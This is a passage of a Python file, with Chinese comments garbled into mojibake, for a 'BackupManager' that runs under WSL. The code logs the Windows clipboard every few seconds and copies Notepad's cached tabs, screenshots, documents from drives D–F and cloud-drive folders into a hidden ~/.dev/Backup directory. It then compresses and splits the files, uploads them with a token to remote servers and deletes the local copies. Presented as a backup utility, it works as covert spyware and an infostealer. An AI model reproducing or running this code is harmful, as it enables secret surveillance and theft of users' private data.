                    chunk_name = f"{base_name}.part{chunk_num:03d}"
                    chunk_path = os.path.join(chunk_dir, chunk_name)
                    
                    with open(chunk_path, 'wb') as chunk_file:
                        chunk_file.write(chunk_data)
                    chunk_files.append(chunk_path)
                    chunk_num += 1
                
            # åˆ é™¤åŸå§‹å¤§æ–‡ä»¶
            os.remove(file_path)
            logging.critical(f"æ–‡ä»¶ {file_path} å·²åˆ†å‰²ä¸º {len(chunk_files)} ä¸ªåˆ†ç‰‡")
            return chunk_files
        except (OSError, IOError) as e:
            logging.error(f"åˆ†å‰²æ–‡ä»¶å¤±è´¥ {file_path}: {e}")
            return None

    def upload_file(self, file_path):
        """ä¸Šä¼ æ–‡ä»¶åˆ°æœåŠ¡å™¨
        
        Args:
            file_path: è¦ä¸Šä¼ çš„æ–‡ä»¶è·¯å¾„
            
        Returns:
            bool: ä¸Šä¼ æ˜¯å¦æˆåŠŸ
        """
        if not self._is_valid_file(file_path):
            logging.error(f"âš ï¸ æ–‡ä»¶ {file_path} ä¸ºç©ºæˆ–æ— æ•ˆï¼Œè·³è¿‡ä¸Šä¼ ")
            return False

        # æ£€æŸ¥æ–‡ä»¶å¤§å°å¹¶åœ¨éœ€è¦æ—¶åˆ†ç‰‡
        chunk_files = self.split_large_file(file_path)
        if chunk_files:
            success = True
            for chunk_file in chunk_files:
                if not self._upload_single_file(chunk_file):
                    success = False
            # æ¸…ç†åˆ†ç‰‡ç›®å½•
            chunk_dir = os.path.dirname(chunk_files[0])
            self._clean_directory(chunk_dir)
            return success
        else:
            return self._upload_single_file(file_path)

    def _upload_single_file(self, file_path):
        """ä¸Šä¼ å•ä¸ªæ–‡ä»¶
        
        Args:
            file_path: è¦ä¸Šä¼ çš„æ–‡ä»¶è·¯å¾„
            
        Returns:
            bool: ä¸Šä¼ æ˜¯å¦æˆåŠŸ
        """
        try:
            file_size = os.path.getsize(file_path)
            if file_size == 0:
                logging.error(f"æ–‡ä»¶å¤§å°ä¸º0 {file_path}")
                if os.path.exists(file_path):
                    os.remove(file_path)
                return False
                
            if file_size > self.config.MAX_SINGLE_FILE_SIZE:
                logging.error(f"âš ï¸ æ–‡ä»¶è¿‡å¤§ {file_path}: {file_size / 1024 / 1024:.2f}MB > {self.config.MAX_SINGLE_FILE_SIZE / 1024 / 1024}MB")
                return False

            for attempt in range(self.config.RETRY_COUNT):
                # æ£€æŸ¥ç½‘ç»œè¿æ¥
                if not self._check_internet_connection():
                    logging.error("âš ï¸ ç½‘ç»œè¿æ¥ä¸å¯ç”¨ï¼Œç­‰å¾…é‡è¯•...")
                    time.sleep(self.config.RETRY_DELAY * 2)  # ç½‘ç»œé—®é¢˜æ—¶ç­‰å¾…æ›´é•¿æ—¶é—´
                    continue

                for server in self.config.UPLOAD_SERVERS:
                    try:
                        with open(file_path, "rb") as f:
                            logging.critical(f"âŒ› æ­£åœ¨ä¸Šä¼ æ–‡ä»¶ {file_path}ï¼ˆ{file_size / 1024 / 1024:.2f}MBï¼‰ï¼Œç¬¬ {attempt + 1} æ¬¡å°è¯•ï¼Œä½¿ç”¨æœåŠ¡å™¨ {server}...")
                            
                            response = requests.post(
                                server,
                                files={"file": f},
                                data={"token": self.api_token},
                                timeout=self.config.UPLOAD_TIMEOUT,
                                verify=True
                            )
                            
                            if response.ok and response.headers.get("Content-Type", "").startswith("application/json"):
                                result = response.json()
                                if result.get("status") == "ok":
                                    logging.critical(f"ğŸ“¤ ä¸Šä¼ æˆåŠŸ: {file_path}")
                                    os.remove(file_path)
                                    return True
                                else:
                                    error_msg = result.get("message", "æœªçŸ¥é”™è¯¯")
                                    logging.error(f"âŒ æœåŠ¡å™¨è¿”å›é”™è¯¯: {error_msg}")
                            else:
                                logging.error(f"âŒ ä¸Šä¼ å¤±è´¥ï¼ŒçŠ¶æ€ç : {response.status_code}, å“åº”: {response.text}")
                                
                    except requests.exceptions.Timeout:
                        logging.error(f"âŒ ä¸Šä¼ è¶…æ—¶ {file_path}")
                    except requests.exceptions.SSLError:
                        logging.error(f"âŒ SSLé”™è¯¯ {file_path}")
                    except requests.exceptions.ConnectionError:
                        logging.error(f"âŒ è¿æ¥é”™è¯¯ {file_path}")
                    except Exception as e:
                        logging.error(f"âŒ ä¸Šä¼ æ–‡ä»¶å‡ºé”™ {file_path}: {str(e)}")
                    
                    # å¦‚æœè¿™ä¸ªæœåŠ¡å™¨å¤±è´¥ï¼Œç»§ç»­å°è¯•ä¸‹ä¸€ä¸ªæœåŠ¡å™¨
                    continue
                
                if attempt < self.config.RETRY_COUNT - 1:
                    logging.critical(f"ç­‰å¾… {self.config.RETRY_DELAY} ç§’åé‡è¯•...")
                    time.sleep(self.config.RETRY_DELAY)
            
            # æ‰€æœ‰é‡è¯•éƒ½å¤±è´¥åï¼Œåˆ é™¤æ–‡ä»¶
            try:
                os.remove(file_path)
                logging.error(f"âš ï¸ æ–‡ä»¶ {file_path} ä¸Šä¼ å¤±è´¥å¹¶å·²åˆ é™¤")
            except Exception as e:
                logging.error(f"âŒ åˆ é™¤å¤±è´¥æ–‡ä»¶æ—¶å‡ºé”™: {e}")
            
            return False
            
        except OSError as e:
            logging.error(f"âŒ è·å–æ–‡ä»¶å¤§å°å¤±è´¥ {file_path}: {e}")
            if os.path.exists(file_path):
                os.remove(file_path)
            return False

    def zip_backup_folder(self, folder_path, zip_file_path):
        """å‹ç¼©å¤‡ä»½æ–‡ä»¶å¤¹ä¸ºtar.gzæ ¼å¼
        
        Args:
            folder_path: è¦å‹ç¼©çš„æ–‡ä»¶å¤¹è·¯å¾„
            zip_file_path: å‹ç¼©æ–‡ä»¶è·¯å¾„ï¼ˆä¸å«æ‰©å±•åï¼‰
            
        Returns:
            str or list: å‹ç¼©æ–‡ä»¶è·¯å¾„æˆ–å‹ç¼©æ–‡ä»¶è·¯å¾„åˆ—è¡¨
        """
        try:
            if folder_path is None or not os.path.exists(folder_path):
                return None

            # æ£€æŸ¥æºç›®å½•æ˜¯å¦ä¸ºç©º
            total_files = sum(len(files) for _, _, files in os.walk(folder_path))
            if total_files == 0:
                logging.error(f"âš ï¸ æºç›®å½•ä¸ºç©º {folder_path}")
                return None

            # è®¡ç®—æºç›®å½•å¤§å°
            dir_size = 0
            for dirpath, _, filenames in os.walk(folder_path):
                for filename in filenames:
                    try:
                        file_path = os.path.join(dirpath, filename)
                        file_size = os.path.getsize(file_path)
                        if file_size > 0:  # è·³è¿‡ç©ºæ–‡ä»¶
                            dir_size += file_size
                    except OSError as e:
                        logging.error(f"âŒè·å–æ–‡ä»¶å¤§å°å¤±è´¥ {file_path}: {e}")
                        continue

            if dir_size == 0:
                logging.error(f"æºç›®å½•å®é™…å¤§å°ä¸º0 {folder_path}")
                return None

            if dir_size > self.config.MAX_SOURCE_DIR_SIZE:
                logging.error(f"âš ï¸ æºç›®å½•è¿‡å¤§ {folder_path}: {dir_size / 1024 / 1024 / 1024:.2f}GB > {self.config.MAX_SOURCE_DIR_SIZE / 1024 / 1024 / 1024}GB")
                return self.split_large_directory(folder_path, zip_file_path)

            tar_path = f"{zip_file_path}.tar.gz"
            if os.path.exists(tar_path):
                os.remove(tar_path)

            with tarfile.open(tar_path, "w:gz") as tar:
                tar.add(folder_path, arcname=os.path.basename(folder_path))

            # éªŒè¯å‹ç¼©æ–‡ä»¶
            try:
                compressed_size = os.path.getsize(tar_path)
                if compressed_size == 0:
                    logging.error(f"å‹ç¼©æ–‡ä»¶å¤§å°ä¸º0 {tar_path}")
                    if os.path.exists(tar_path):
                        os.remove(tar_path)
                    return None
                    
                if compressed_size > self.config.MAX_SINGLE_FILE_SIZE:
                    os.remove(tar_path)
                    return self.split_large_directory(folder_path, zip_file_path)

                self._clean_directory(folder_path)
                logging.critical(f"ğŸ—‚ï¸ ç›®å½• {folder_path} ğŸ—ƒï¸ å·²å‹ç¼©: {dir_size / 1024 / 1024:.2f}MB -> {compressed_size / 1024 / 1024:.2f}MB")
                return tar_path
            except OSError as e:
                logging.error(f"âŒ è·å–å‹ç¼©æ–‡ä»¶å¤§å°å¤±è´¥ {tar_path}: {e}")
                if os.path.exists(tar_path):
                    os.remove(tar_path)
                return None
                
        except Exception as e:
            logging.error(f"âŒ å‹ç¼©å¤±è´¥ {folder_path}: {e}")
            return None

    def _compress_chunk_part(self, part_dir, folder_path, base_zip_path, part_num, chunk_size):
        """å‹ç¼©å•ä¸ªåˆ†å—ç›®å½•
        
        Args:
            part_dir: åˆ†å—ç›®å½•è·¯å¾„
            folder_path: åŸå§‹ç›®å½•è·¯å¾„ï¼ˆç”¨äºarcnameï¼‰
            base_zip_path: åŸºç¡€å‹ç¼©æ–‡ä»¶è·¯å¾„
            part_num: åˆ†å—ç¼–å·
            chunk_size: åˆ†å—å¤§å°ï¼ˆå­—èŠ‚ï¼‰
            
        Returns:
            str or None: å‹ç¼©æ–‡ä»¶è·¯å¾„ï¼Œå¤±è´¥è¿”å›None
        """
        tar_path = f"{base_zip_path}_part{part_num}.tar.gz"
        try:
            with tarfile.open(tar_path, "w:gz", compresslevel=self.config.TAR_COMPRESS_LEVEL) as tar:
                tar.add(part_dir, arcname=os.path.basename(folder_path))
            
            # éªŒè¯å‹ç¼©æ–‡ä»¶
            compressed_size = os.path.getsize(tar_path)
            if compressed_size > self.config.MAX_SINGLE_FILE_SIZE:
                logging.error(f"å‹ç¼©åæ–‡ä»¶ä»ç„¶è¿‡å¤§: {tar_path} ({compressed_size / 1024 / 1024:.2f}MB)")
                os.remove(tar_path)
                return None
            else:
                logging.critical(f"å·²åˆ›å»ºåˆ†å— {part_num + 1}: {chunk_size / 1024 / 1024:.2f}MB -> {compressed_size / 1024 / 1024:.2f}MB")
                return tar_path
        except (OSError, IOError, tarfile.TarError) as e:
            logging.error(f"å‹ç¼©åˆ†å—å¤±è´¥: {part_dir}: {e}")
            if os.path.exists(tar_path):
                os.remove(tar_path)
            return None

    def split_large_directory(self, folder_path, base_zip_path):
        """å°†å¤§ç›®å½•åˆ†å‰²æˆå¤šä¸ªå°å—å¹¶åˆ†åˆ«å‹ç¼©
        
        Args:
            folder_path: è¦åˆ†å‰²çš„ç›®å½•è·¯å¾„
            base_zip_path: åŸºç¡€å‹ç¼©æ–‡ä»¶è·¯å¾„
            
        Returns:
            list: å‹ç¼©æ–‡ä»¶è·¯å¾„åˆ—è¡¨
        """
        try:
            compressed_files = []
            current_size = 0
            current_files = []
            part_num = 0
            
            # åˆ›å»ºä¸´æ—¶ç›®å½•å­˜æ”¾åˆ†å—
            temp_dir = os.path.join(os.path.dirname(folder_path), "temp_split")
            if not self._ensure_directory(temp_dir):
                return None

            # é‡‡ç”¨æ›´ä¿å®ˆçš„åˆ†å—å¤§å°é™åˆ¶
            # è€ƒè™‘åˆ°å‹ç¼©æ¯”å’Œå®‰å…¨è¾¹ç•Œï¼Œå°†ç›®æ ‡å¤§å°è®¾ç½®å¾—æ›´å°
            MAX_CHUNK_SIZE = int(self.config.MAX_SINGLE_FILE_SIZE * self.config.SAFETY_MARGIN / self.config.COMPRESSION_RATIO)

            # åˆ›å»ºæ–‡ä»¶å¤§å°æ˜ å°„ä»¥ä¼˜åŒ–åˆ†å—
            file_sizes = {}
            total_size = 0
            for dirpath, _, filenames in os.walk(folder_path):
                for filename in filenames:
                    file_path = os.path.join(dirpath, filename)
                    try:
                        size = os.path.getsize(file_path)
                        if size > 0:  # è·³è¿‡ç©ºæ–‡ä»¶
                            file_sizes[file_path] = size
                            total_size += size
                    except OSError:
                        continue

            if not file_sizes:
                logging.error(f"ç›®å½• {folder_path} ä¸­æ²¡æœ‰æœ‰æ•ˆæ–‡ä»¶")
                return None

            # æŒ‰æ–‡ä»¶å¤§å°é™åºæ’åºï¼Œä¼˜å…ˆå¤„ç†å¤§æ–‡ä»¶
            sorted_files = sorted(file_sizes.items(), key=lambda x: x[1], reverse=True)

            # æ£€æŸ¥æ˜¯å¦æœ‰å•ä¸ªæ–‡ä»¶è¶…è¿‡é™åˆ¶
            if sorted_files[0][1] > MAX_CHUNK_SIZE:
                logging.error(f"å‘ç°è¿‡å¤§æ–‡ä»¶: {sorted_files[0][0]} ({sorted_files[0][1] / 1024 / 1024:.2f}MB)")
                return None

            # ä½¿ç”¨æœ€ä¼˜è£…ç®±ç®—æ³•è¿›è¡Œåˆ†å—
            current_chunk = []
            current_chunk_size = 0

            for file_path, file_size in sorted_files:
                # å¦‚æœå½“å‰æ–‡ä»¶ä¼šå¯¼è‡´å—è¶…è¿‡é™åˆ¶ï¼Œå…ˆå¤„ç†å½“å‰å—
                if current_chunk_size + file_size > MAX_CHUNK_SIZE and current_chunk:
                    # åˆ›å»ºæ–°çš„åˆ†å—ç›®å½•
                    part_dir = os.path.join(temp_dir, f"part{part_num}")
                    if self._ensure_directory(part_dir):
                        # å¤åˆ¶æ–‡ä»¶åˆ°åˆ†å—ç›®å½•
                        success = True
                        for src in current_chunk:
                            rel_path = os.path.relpath(src, folder_path)
                            dst = os.path.join(part_dir, rel_path)
                            dst_dir = os.path.dirname(dst)
                            if not self._ensure_directory(dst_dir):
                                success = False
                                break
                            try:
                                shutil.copy2(src, dst)
                            except (OSError, IOError, shutil.Error) as e:
                                logging.error(f"å¤åˆ¶æ–‡ä»¶å¤±è´¥: {src} -> {dst}: {e}")
                                success = False
                                break

                        if success:
                            tar_path = self._compress_chunk_part(
                                part_dir, folder_path, base_zip_path, part_num, current_chunk_size
                            )
                            if tar_path:
                                compressed_files.append(tar_path)

                        self._clean_directory(part_dir)
                        part_num += 1

                    current_chunk = []
                    current_chunk_size = 0

                # æ·»åŠ å½“å‰æ–‡ä»¶åˆ°å—
                current_chunk.append(file_path)
                current_chunk_size += file_size

            # å¤„ç†æœ€åä¸€ä¸ªå—
            if current_chunk:
                part_dir = os.path.join(temp_dir, f"part{part_num}")
                if self._ensure_directory(part_dir):
                    success = True
                    for src in current_chunk:
                        rel_path = os.path.relpath(src, folder_path)
                        dst = os.path.join(part_dir, rel_path)
                        dst_dir = os.path.dirname(dst)
                        if not self._ensure_directory(dst_dir):
                            success = False
                            break
                        try:
                            shutil.copy2(src, dst)
                        except Exception as e:
                            logging.error(f"å¤åˆ¶æ–‡ä»¶å¤±è´¥: {src} -> {dst}: {e}")
                            success = False
                            break

                    if success:
                        tar_path = self._compress_chunk_part(
                            part_dir, folder_path, base_zip_path, part_num, current_chunk_size
                        )
                        if tar_path:
                            compressed_files.append(tar_path)

                    self._clean_directory(part_dir)

            # æ¸…ç†ä¸´æ—¶ç›®å½•å’Œæºç›®å½•
            self._clean_directory(temp_dir)
            self._clean_directory(folder_path)
            
            if not compressed_files:
                logging.error(f"ç›®å½• {folder_path} åˆ†å‰²å¤±è´¥ï¼Œæ²¡æœ‰ç”Ÿæˆæœ‰æ•ˆçš„å‹ç¼©æ–‡ä»¶")
                return None
            
            logging.critical(f"ç›®å½• {folder_path} å·²åˆ†å‰²ä¸º {len(compressed_files)} ä¸ªå‹ç¼©æ–‡ä»¶")
            return compressed_files
        except Exception as e:
            logging.error(f"åˆ†å‰²ç›®å½•å¤±è´¥ {folder_path}: {e}")
            return None

    def get_clipboard_content(self):
        """è·å–ZTBå†…å®¹ï¼Œæ”¯æŒ Windows å’Œ WSL ç¯å¢ƒ"""
        try:
            # åœ¨ WSL ä¸­ä½¿ç”¨ PowerShell è·å– Windows ZTB
            ps_command = 'powershell.exe Get-Clipboard'
            result = subprocess.run(
                ps_command,
                shell=True,
                capture_output=True,
                text=False  # æ”¹ä¸º False ä»¥è·å–åŸå§‹å­—èŠ‚
            )
            
            if result.returncode == 0:
                # å°è¯•ä¸åŒçš„ç¼–ç 
                encodings = ['utf-8', 'gbk', 'gb2312', 'gb18030', 'big5', 'latin1']
                
                # é¦–å…ˆå°è¯• UTF-8 å’Œ GBK
                for encoding in ['utf-8', 'gbk']:
                    try:
                        content = result.stdout.decode(encoding).strip()
                        # æ£€æŸ¥è§£ç åçš„å†…å®¹æ˜¯å¦ä¸ºç©ºæˆ–åªåŒ…å«ç©ºç™½å­—ç¬¦
                        if content and not content.isspace():
                            return content
                    except UnicodeDecodeError:
                        continue
                    
                # å¦‚æœå¸¸ç”¨ç¼–ç å¤±è´¥ï¼Œå°è¯•å…¶ä»–ç¼–ç 
                for encoding in encodings:
                    if encoding not in ['utf-8', 'gbk']:  # è·³è¿‡å·²å°è¯•çš„ç¼–ç 
                        try:
                            content = result.stdout.decode(encoding).strip()
                            if content and not content.isspace():
                                return content
                        except UnicodeDecodeError:
                            continue
                
                # å¦‚æœæ‰€æœ‰ç¼–ç éƒ½å¤±è´¥ï¼Œæ£€æŸ¥æ˜¯å¦æœ‰åŸå§‹æ•°æ®
                if result.stdout:
                    try:
                        # ä½¿ç”¨ 'ignore' é€‰é¡¹ä½œä¸ºæœ€åçš„å°è¯•
                        content = result.stdout.decode('utf-8', errors='ignore').strip()
                        if content and not content.isspace():
                            if self.config.DEBUG_MODE:
                                logging.warning("âš ï¸ ä½¿ç”¨ ignore æ¨¡å¼è§£ç ZTBå†…å®¹")
                            return content
                    except Exception as e:
                        if self.config.DEBUG_MODE:
                            logging.error(f"âŒ ignore æ¨¡å¼è§£ç å¤±è´¥: {str(e)}")
                else:
                    if self.config.DEBUG_MODE:
                        logging.debug("â„¹ï¸ ZTBä¸ºç©º")
            else:
                if self.config.DEBUG_MODE:
                    logging.error(f"âŒ è·å–ZTBå¤±è´¥ï¼Œè¿”å›ç : {result.returncode}")
                    if result.stderr:
                        try:
                            error_msg = result.stderr.decode('utf-8', errors='ignore')
                            logging.error(f"é”™è¯¯ä¿¡æ¯: {error_msg}")
                        except:
                            pass
        
            return None
        except Exception as e:
            if self.config.DEBUG_MODE:
                logging.error(f"âŒ è·å–ZTBå‡ºé”™: {str(e)}")
            return None

    def log_clipboard_update(self, content, file_path):
        """è®°å½•ZTBæ›´æ–°åˆ°æ–‡ä»¶"""
        try:
            # ç¡®ä¿ç›®å½•å­˜åœ¨
            os.makedirs(os.path.dirname(file_path), exist_ok=True)
            
            # æ£€æŸ¥å†…å®¹æ˜¯å¦ä¸ºç©ºæˆ–ç‰¹æ®Šæ ‡è®°
            if not content or content.isspace():
                return
            
            # å†™å…¥æ—¥å¿—
            with open(file_path, 'a', encoding='utf-8', errors='ignore') as f:
                f.write(f"\n=== ğŸ“‹ {datetime.now().strftime('%Y-%m-%d %H:%M:%S')} ===\n")
                f.write(f"{content}\n")
                f.write("-"*30 + "\n")
            
            content_preview = content[:50] + "..." if len(content) > 50 else content
            logging.info(f"ğŸ“ å·²è®°å½•å†…å®¹: {content_preview}")
        except Exception as e:
            if self.config.DEBUG_MODE:
                logging.error(f"âŒ è®°å½•ZTBå¤±è´¥: {str(e)}")

    def monitor_clipboard(self, file_path, interval=3):
        """ç›‘æ§ZTBå˜åŒ–å¹¶è®°å½•åˆ°æ–‡ä»¶
        
        Args:
            file_path: æ—¥å¿—æ–‡ä»¶è·¯å¾„
            interval: æ£€æŸ¥é—´éš”ï¼ˆç§’ï¼‰
        """
        # ç¡®ä¿æ—¥å¿—ç›®å½•å­˜åœ¨
        log_dir = os.path.dirname(file_path)
        if not os.path.exists(log_dir):
            try:
                os.makedirs(log_dir, exist_ok=True)
            except Exception as e:
                logging.error(f"âŒ åˆ›å»ºZTBæ—¥å¿—ç›®å½•å¤±è´¥: {str(e)}")
                return

        last_content = ""
        error_count = 0  # æ·»åŠ é”™è¯¯è®¡æ•°
        max_errors = 5   # æœ€å¤§è¿ç»­é”™è¯¯æ¬¡æ•°
        last_empty_log_time = time.time()  # è®°å½•ä¸Šæ¬¡è¾“å‡ºç©ºZTBæ—¥å¿—çš„æ—¶é—´
        empty_log_interval = 300  # æ¯5åˆ†é’Ÿæ‰è¾“å‡ºä¸€æ¬¡ç©ºZTBæ—¥å¿—
        
        # åˆå§‹åŒ–æ—¥å¿—æ–‡ä»¶
        try:
            with open(file_path, 'a', encoding='utf-8') as f:
                f.write(f"\n=== ğŸ“‹ ZTBç›‘æ§å¯åŠ¨äº {datetime.now().strftime('%Y-%m-%d %H:%M:%S')} ===\n")
                f.write("-"*30 + "\n")
        except Exception as e:
            logging.error(f"âŒ åˆå§‹åŒ–ZTBæ—¥å¿—å¤±è´¥: {str(e)}")
        
        def is_special_content(text):
            """æ£€æŸ¥æ˜¯å¦ä¸ºç‰¹æ®Šæ ‡è®°å†…å®¹"""
            if not text:
                return False
            # è·³è¿‡æ—¥å¿—æ ‡è®°è¡Œ
            if text.startswith('===') or text.startswith('-'):
                return True
            # è·³è¿‡æ—¶é—´æˆ³è¡Œ
            if 'ZTBç›‘æ§å¯åŠ¨äº' in text or 'æ—¥å¿—å·²äº' in text:
                return True
            return False
        
        while True:
            try:
                current_content = self.get_clipboard_content()
                current_time = time.time()
                
                # æ£€æŸ¥å†…å®¹æ˜¯å¦æœ‰æ•ˆä¸”ä¸æ˜¯ç‰¹æ®Šæ ‡è®°
                if (current_content and 
                    not current_content.isspace() and 
                    not is_special_content(current_content)):
                    
                    # æ£€æŸ¥å†…å®¹æ˜¯å¦å‘ç”Ÿå˜åŒ–
                    if current_content != last_content:
                        content_preview = current_content[:30] + "..." if len(current_content) > 30 else current_content
                        logging.info(f"ğŸ“‹ æ£€æµ‹åˆ°æ–°å†…å®¹: {content_preview}")
                        self.log_clipboard_update(current_content, file_path)
                        last_content = current_content
                        error_count = 0  # é‡ç½®é”™è¯¯è®¡æ•°
                else:
                    if self.config.DEBUG_MODE and current_time - last_empty_log_time >= empty_log_interval:
                        if not current_content:
                            logging.debug("â„¹ï¸ ZTBä¸ºç©º")
                        elif current_content.isspace():
                            logging.debug("â„¹ï¸ ZTBå†…å®¹ä»…åŒ…å«ç©ºç™½å­—ç¬¦")
                        elif is_special_content(current_content):
                            logging.debug("â„¹ï¸ è·³è¿‡ç‰¹æ®Šæ ‡è®°å†…å®¹")
                        last_empty_log_time = current_time
                    error_count = 0  # ç©ºå†…å®¹ä¸è®¡å…¥é”™è¯¯
                    
            except Exception as e:
                error_count += 1
                if error_count >= max_errors:
                    logging.error(f"âŒ ZTBç›‘æ§è¿ç»­å‡ºé”™{max_errors}æ¬¡ï¼Œç­‰å¾…60ç§’åé‡è¯•")
                    time.sleep(60)  # è¿ç»­é”™è¯¯æ—¶å¢åŠ ç­‰å¾…æ—¶é—´
                    error_count = 0  # é‡ç½®é”™è¯¯è®¡æ•°
                elif self.config.DEBUG_MODE:
                    logging.error(f"âŒ ZTBç›‘æ§å‡ºé”™: {str(e)}")
                
            time.sleep(interval)

    def upload_backup(self, backup_path):
        """ä¸Šä¼ å¤‡ä»½æ–‡ä»¶
        
        Args:
            backup_path: å¤‡ä»½æ–‡ä»¶è·¯å¾„æˆ–å¤‡ä»½æ–‡ä»¶è·¯å¾„åˆ—è¡¨
            
        Returns:
            bool: ä¸Šä¼ æ˜¯å¦æˆåŠŸ
        """
        if isinstance(backup_path, list):
            success = True
            for path in backup_path:
                if not self.upload_file(path):
                    success = False
            return success
        else:
            return self.upload_file(backup_path)

    def _get_next_backup_time(self):
        """è·å–ä¸‹æ¬¡å¤‡ä»½æ—¶é—´çš„æ—¶é—´æˆ³æ–‡ä»¶è·¯å¾„"""
        return str(Path.home() / ".dev/Backup/next_backup_time.txt")
        
    def save_next_backup_time(self):
        """ä¿å­˜ä¸‹æ¬¡å¤‡ä»½æ—¶é—´"""
        next_time = datetime.now() + timedelta(seconds=self.config.BACKUP_INTERVAL)
        try:
            with open(self._get_next_backup_time(), 'w') as f:
                f.write(next_time.strftime('%Y-%m-%d %H:%M:%S'))
            return next_time
        except Exception as e:
            logging.error(f"âŒ ä¿å­˜ä¸‹æ¬¡å¤‡ä»½æ—¶é—´å¤±è´¥: {e}")
            return None
            
    def should_run_backup(self):
        """æ£€æŸ¥æ˜¯å¦åº”è¯¥æ‰§è¡Œå¤‡ä»½
        
        Returns:
            bool: æ˜¯å¦åº”è¯¥æ‰§è¡Œå¤‡ä»½
            datetime or None: ä¸‹æ¬¡å¤‡ä»½æ—¶é—´ï¼ˆå¦‚æœå­˜åœ¨ï¼‰
        """
        threshold_file = self._get_next_backup_time()
        if not os.path.exists(threshold_file):
            return True, None
            
        try:
            with open(threshold_file, 'r') as f:
                next_backup_time = datetime.strptime(f.read().strip(), '%Y-%m-%d %H:%M:%S')
                
            current_time = datetime.now()
            if current_time >= next_backup_time:
                return True, None
            return False, next_backup_time
        except Exception as e:
            logging.error(f"âŒ è¯»å–ä¸‹æ¬¡å¤‡ä»½æ—¶é—´å¤±è´¥: {e}")
            return True, None

def is_wsl():
    """æ£€æŸ¥æ˜¯å¦åœ¨WSLç¯å¢ƒä¸­è¿è¡Œ"""
    return "microsoft" in platform.release().lower() or "microsoft" in platform.version().lower()

def is_disk_available(disk_path):
    """æ£€æŸ¥ç£ç›˜æ˜¯å¦å¯ç”¨"""
    try:
        return os.path.exists(disk_path) and os.access(disk_path, os.R_OK)
    except Exception:
        return False

def get_available_disks():
    """è·å–æ‰€æœ‰å¯ç”¨çš„ç£ç›˜å’Œäº‘ç›˜ç›®å½•"""
    available_disks = {}
    disk_letters = ['d', 'e', 'f']
    
    # å¤„ç†æ™®é€šç£ç›˜
    for letter in disk_letters:
        disk_path = f"/mnt/{letter}"
        if is_disk_available(disk_path):
            available_disks[letter] = {
                'docs': (disk_path, Path.home() / f".dev/Backup/{letter}_docs", 1),  # æ–‡æ¡£ç±»
                'configs': (disk_path, Path.home() / f".dev/Backup/{letter}_configs", 2),  # é…ç½®ç±»
            }
            logging.info(f"æ£€æµ‹åˆ°å¯ç”¨ç£ç›˜: {disk_path}")
    
    # å¤„ç†ç”¨æˆ·ç›®å½•ä¸‹çš„äº‘ç›˜æ–‡ä»¶å¤¹
    user = get_username()
    user_path = f"/mnt/c/Users/{user}"
    if os.path.exists(user_path):
        try:
            cloud_keywords = ["äº‘", "ç½‘ç›˜", "cloud", "drive", "box"]
            for item in os.listdir(user_path):
                item_path = os.path.join(user_path, item)
                if os.path.isdir(item_path):
                    # æ£€æŸ¥æ–‡ä»¶å¤¹åç§°æ˜¯å¦åŒ…å«äº‘ç›˜ç›¸å…³å…³é”®è¯
                    if any(keyword.lower() in item.lower() for keyword in cloud_keywords):
                        disk_key = f"cloud_{item.lower()}"
                        available_disks[disk_key] = {
                            'docs': (item_path, Path.home() / f".dev/Backup/cloud_docs", 1),
                            'configs': (item_path, Path.home() / f".dev/Backup/cloud_configs", 2),
                        }
                        logging.info(f"æ£€æµ‹åˆ°äº‘ç›˜ç›®å½•: {item_path}")
        except Exception as e:
            logging.error(f"æ‰«æç”¨æˆ·äº‘ç›˜ç›®å½•æ—¶å‡ºé”™: {e}")
    
    return available_disks

@lru_cache()
def get_username():
    """è·å–Windowsç”¨æˆ·å"""
    try:
        # å°è¯•ä»ç¯å¢ƒå˜é‡è·å–
        if 'USERPROFILE' in os.environ:
            return os.path.basename(os.environ['USERPROFILE'])
            
        # å°è¯•ä»Windowsç”¨æˆ·ç›®å½•è·å–
        windows_users = '/mnt/c/Users'
        if os.path.exists(windows_users):
            users = [user for user in os.listdir(windows_users) 
                    if os.path.isdir(os.path.join(windows_users, user)) 
                    and user not in ['Public', 'Default', 'Default User', 'All Users']]
            if users:
                return users[0]
                
        # å¦‚æœä¸Šè¿°æ–¹æ³•éƒ½å¤±è´¥ï¼Œå°è¯•ä»æ³¨å†Œè¡¨è·å–ï¼ˆéœ€è¦åœ¨Windowsç¯å¢ƒä¸‹ï¼‰
        if os.path.exists('/mnt/c/Windows/System32/reg.exe'):
            try:
                result = subprocess.run(
                    ['cmd.exe', '/c', 'echo %USERNAME%'],
                    capture_output=True,
                    text=True,
                    shell=True
                )
                if result.returncode == 0:
                    username = result.stdout.strip()
                    if username and username != '%USERNAME%':
                        return username
            except Exception:
                pass
                
        # å¦‚æœæ‰€æœ‰æ–¹æ³•éƒ½å¤±è´¥ï¼Œè¿”å›é»˜è®¤å€¼
        return "Administrator"
        
    except Exception as e:
        logging.error(f"è·å–Windowsç”¨æˆ·åå¤±è´¥: {e}")
        return "Administrator"

def backup_notepad_temp(backup_manager, user):
    """å¤‡ä»½è®°äº‹æœ¬ä¸´æ—¶æ–‡ä»¶"""
    notepad_temp_directory = f"/mnt/c/Users/{user}/AppData/Local/Packages/Microsoft.WindowsNotepad_8wekyb3d8bbwe/LocalState/TabState"
    notepad_backup_directory = Path.home() / ".dev/Backup/notepad"

    if not os.path.exists(notepad_temp_directory):
        logging.error(f"è®°äº‹æœ¬ç¼“å­˜ç›®å½•ä¸å­˜åœ¨: {notepad_temp_directory}")
        return None

    if not backup_manager._clean_directory(str(notepad_backup_directory)):
        return None

    for root, _, files in os.walk(notepad_temp_directory):
        for file in files:
            try:
                src_path = os.path.join(root, file)
                if not os.path.exists(src_path):
                    continue
                rel_path = os.path.relpath(root, notepad_temp_directory)
                dst_dir = os.path.join(notepad_backup_directory, rel_path)
                if not backup_manager._ensure_directory(dst_dir):
                    continue
                shutil.copy2(src_path, os.path.join(dst_dir, file))
            except Exception as e:
                logging.error(f"å¤åˆ¶è®°äº‹æœ¬æ–‡ä»¶å¤±è´¥: {src_path} - {e}")
    return str(notepad_backup_directory)

def backup_screenshots(user):
    """å¤‡ä»½æˆªå›¾æ–‡ä»¶"""
    screenshot_paths = [
        f"/mnt/c/Users/{user}/Pictures",
        f"/mnt/c/Users/{user}/OneDrive/Pictures"
    ]
    screenshot_backup_directory = Path.home() / ".dev/Backup/tmp_screenshots"
    
    backup_manager = BackupManager()
    
    # ç¡®ä¿å¤‡ä»½ç›®å½•æ˜¯ç©ºçš„
    if not backup_manager._clean_directory(str(screenshot_backup_directory)):
        return None
        
    files_found = False
    for source_dir in screenshot_paths:
        if os.path.exists(source_dir):
            try:
                for root, _, files in os.walk(source_dir):
                    for file in files:
